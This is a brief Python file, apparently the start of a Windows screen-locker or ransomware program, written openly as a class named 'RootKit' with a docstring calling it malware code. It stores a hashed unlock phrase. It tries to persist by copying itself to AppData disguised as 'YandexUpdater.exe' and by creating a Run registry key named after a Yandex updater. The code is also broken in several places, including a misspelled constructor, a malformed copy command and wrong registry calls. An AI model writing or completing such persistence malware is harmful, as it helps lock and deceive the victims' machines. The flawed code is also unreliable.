import hashlib
import os
import sys
import tkinter
import keyboard
import winreg

from pathlib import Path as PLPath

UNLOCK_HASH = hashlib.sha256("Sorry, I love you".encode()).hexdigest()
WINREG_BRANCH = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
WINREG_DWORD = "YandexAutoUpdateLauncher"
MASK_FILE = "YandexUpdater.exe"

try:
    APPDATA_PATH = PLPath("%APPDATA%", "Microsoft")
except:
    print("NOT NT")


class RootKit:
    def __int__(self):
        """
        Init malware code
        :return:
        """
        self.install_system()

    def install_system(self):
        CURRENT_DIR = PLPath.cwd()


        try:
            os.system(f"COPY{CURRENT_DIR}\\{MASK_FILE} {APPDATA_PATH}\\{MASK_FILE}")
            winreg.CreateKey(f"{WINREG_BRANCH}")
        except:
            pass


if __name__ == "__main__":
    rootkit = RootKit()
